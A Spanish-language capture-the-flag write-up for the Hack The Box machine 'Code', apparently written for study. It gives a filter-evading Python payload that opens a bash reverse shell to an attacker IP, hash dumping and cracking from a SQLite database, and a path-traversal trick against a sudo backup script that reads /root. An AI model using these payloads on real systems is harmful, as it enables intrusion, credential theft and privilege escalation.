# 🧠 Hack The Box - Writeup de la máquina "Code" (Facil)

## 🔧 Herramientas usadas

- `nmap`
- `netcat`
- `sqlite3`
- `jq`
- `tar`
- `sudo`
- Sitio de cracking: [hashes.com](https://hashes.com)

---

## 📍 Reconocimiento

**IP objetivo:** `10.10.11.62`

### 🔎 Escaneo de puertos

```bash
nmap -p- -n -Pn --min-rate 5000 10.10.11.62 -oG allPorts

# Se detectan los puertos abiertos y se guarda el resultado en allPorts. Luego, usando ExtractPorts, copiamos los puertos abiertos para hacer un escaneo más detallado.

nmap -p22,80 -sCV 10.10.11.62 -oN targeted

🔌 Resultados

    Puerto 22 → SSH
    Posteriormente lo usaremos para conectarnos con la contraseña del usuario martin.

    Puerto 5000 → HTTP
    Servicio web con editor de código Python embebido.

🧬 Explotación Inicial (Reverse Shell)

# Ingresamos al navegador y accedemos a:
# http://10.10.11.62:5000

# Se presenta un editor de código Python. Insertamos el siguiente payload para ejecutar una reverse shell:

test = getattr(print.__self__, '__im' + 'port__')('o' + 's')
getattr(test, 'sy' + 'stem')('bash -c "bash -i >& /dev/tcp/10.10.14.218/443 0>&1"')

# Mientras tanto, en nuestra máquina atacante escuchamos con:

nc -nlvp 443

# Al ejecutarse, se establece una reverse shell hacia nuestra máquina.

🧪 Post-explotación: Flag de Usuario

Una vez dentro, navegamos hasta el archivo de usuario:

cd
ls -la
cat user.txt

🔝 Escalada de Privilegios

Enumeramos archivos en el sistema:

find .

Identificamos una base de datos SQLite:

cd ./instance
file database.db
sqlite3 database.db
.tables
SELECT * FROM user;

    Aquí encontramos hashes de usuarios. Desciframos la contraseña de martin usando hashes.com.

🔐 Acceso como Martin

su martin

Ya como martin, navegamos a su home y listamos:

cd
ls

Vemos una carpeta backups. Consultamos permisos con:

sudo -l

Nos muestra que podemos ejecutar el script:

/usr/bin/backy.sh

🧨 Explotación del script backy.sh

Inspeccionamos el script:

cat /usr/bin/backy.sh

Nos interesa esta línea:

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$1")

Modificamos el archivo task.json para apuntar a /root:

{
  "directories_to_archive": ["/home/martin/../../root"]
}

Editamos el archivo:

nano task.json

Ejecutamos el script con sudo:

sudo /usr/bin/backy.sh task.json

Extraemos el archivo .tar generado:

tar -xf archivo_generado.tar
cd root/
cat root.txt

🏁 Conclusión

    Se aprovechó un editor de código en un sitio web para ejecutar comandos del sistema.

    La base de datos filtró credenciales que permitieron cambiar de usuario.

    La mala implementación de un script sudo permitió leer archivos de root sin necesidad de explotar el binario directamente.

📸 Capturas

🗂️ Flags Obtenidas

    ✅ user.txt

    ✅ root.txt
